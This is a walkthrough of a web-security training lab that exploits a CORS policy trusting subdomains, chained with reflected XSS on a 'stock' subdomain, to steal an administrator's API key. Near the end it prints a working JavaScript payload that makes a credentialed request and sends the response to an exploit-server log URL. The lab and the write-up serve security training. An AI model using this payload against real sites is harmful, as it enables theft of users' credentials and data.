**CORS || Lab#3 || CORS vulnerability with trusted insecure protocols**

<img width="785" height="437" alt="image" src="https://github.com/user-attachments/assets/d5210d23-c2fe-42e3-9e2a-92f8723ad3fb" />

Goal of this lab is to exploit the CORS misconfiguration to retrieve the admin API key.

Credentials: wiener : peter

Lets start the lab and login

<img width="782" height="350" alt="image" src="https://github.com/user-attachments/assets/8b92f6bc-c24d-4a97-b330-e9676a75dbb0" />

Lets check this traffic in Burpsuite

<img width="1000" height="423" alt="image" src="https://github.com/user-attachments/assets/8bcb88ee-49d9-405b-8264-d60ec5486326" />

There is a request /accountDetails which is in JSON. In the respond we can see apikey of the user and Access-Control-Allow-Credentials is true.

Lets move this traffic to Repeater

<img width="750" height="516" alt="image" src="https://github.com/user-attachments/assets/36c9bfa9-0277-4ef5-8fd5-fccef8fcc787" />

Now we have to test for CORS misconfiguration.
1. Change the origin to an arbitrary value.

Lets add the Origin header and see if the application accepts it.

If application accepts it, it means application is accepting any random webpage on the internet to access it data.

<img width="1000" height="363" alt="image" src="https://github.com/user-attachments/assets/c0463fd0-64fb-4650-a1e0-a491f926ec59" />

We got a 200 Ok response and can see Access-Control-Allow-Credentials is true.

This time there is no Access-Control-Allow-Origin response header. So it means it does not accept arbitrary origin.

2. Change the original header to the Null value.

   <img width="1000" height="369" alt="image" src="https://github.com/user-attachments/assets/0f27148f-a54e-4179-8dd8-2d1ab4c3248a" />

This time also there is no Access-Control-Allow-Origin response header. So it means it does not accept null origin as well.

3. Change the Origin header to one that begins with the origin of the site.

   In this case, we will add the HOST domain to the origin following with malicious website.

   <img width="1000" height="374" alt="image" src="https://github.com/user-attachments/assets/b547cf9d-16ad-4b49-af33-46a2e24af936" />

Again, there is no Access-Control-Allow-Origin response header. So this test case fails as well.

4. Change the Origin header to one that ends with the origin of the site.

   <img width="1000" height="371" alt="image" src="https://github.com/user-attachments/assets/bc642441-0c0a-46e1-8ddc-c44ca057860c" />

And this time Access-Control-Allow-Origin response header has the same value as request Origin. So it trust the sub-domain of the web site. Also Access-Control-Allow-Credentials is true.

So, this website trust all the sub-domains. It could be problematic. If there is a vulnerability  in one of the sub-domain, lets say XSS, we can use that vulnerability to host a malicious script on the sub-domain and with CORS rule we can exploit it. 

Now we need to find a vulnerable sub-domain. 

Lets go to home page and check any product

<img width="996" height="242" alt="image" src="https://github.com/user-attachments/assets/536d51ae-d1dc-4c8d-a830-6d4181ff8d09" />

Click on Check stock

<img width="882" height="347" alt="image" src="https://github.com/user-attachments/assets/055d7d18-1bbc-4182-ada5-95e4799c9007" />

A new box opens that tell the stock level. 

Lets check this traffic in Burp

<img width="1000" height="406" alt="image" src="https://github.com/user-attachments/assets/3b994be1-17ae-415f-8474-4389ffcc7ede" />

We found a new sub-domain stock that tells about the stock.

Lets check if this sub-domain is vulnerable to XSS

Move this request to Repeater

<img width="1000" height="368" alt="image" src="https://github.com/user-attachments/assets/2ba20268-bd20-4bb7-9eca-bbe8de5a5e03" />

It has two parameters productId and storeId. 

Lets check productId parameter first

<img width="1000" height="375" alt="image" src="https://github.com/user-attachments/assets/82ead3a1-e8ce-4278-9c24-cf5eb09cfe7d" />

We have put a simple script in the parameter and in the Response we can see an alert (1) is generated. 

It confirms that this sub-domain is vulnerable to XSS.

Now, we will use this sub-domain to exploit CORS configuration to get apikey of the Administrator.

Lets create a script

```
<script>
 document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

We have to add our Lab ID and Exploit server ID in the script.

<img width="1000" height="265" alt="image" src="https://github.com/user-attachments/assets/3b90f5ed-4ef0-478c-9c6d-25d9b1f6cf2b" />

<img width="1000" height="294" alt="image" src="https://github.com/user-attachments/assets/79439a82-c581-4303-9635-54da80cd1cc4" />

Lets put the script in the Body

<img width="1000" height="318" alt="image" src="https://github.com/user-attachments/assets/eb5c4edc-45f2-4c09-8599-4c2fa9f6460f" />

Click on Store and Deliver exploit to victim.

Now, the Administrator user will receive the exploit and will click on it.

Click on Access log

<img width="1000" height="115" alt="image" src="https://github.com/user-attachments/assets/ea5aaa4a-8618-4590-b4ca-db30a378adce" />

The key is URL encoded. Lets decode it

<img width="1000" height="367" alt="image" src="https://github.com/user-attachments/assets/458be529-aa86-4677-9b1c-379c86aad0b0" />

We got the Administrator API Key.

<img width="1000" height="337" alt="image" src="https://github.com/user-attachments/assets/ac681397-3672-467e-a439-e16147156d8c" />

And lab is solved

<img width="1000" height="251" alt="image" src="https://github.com/user-attachments/assets/90c8a9e4-4623-4a57-9566-84b4459ed5da" />

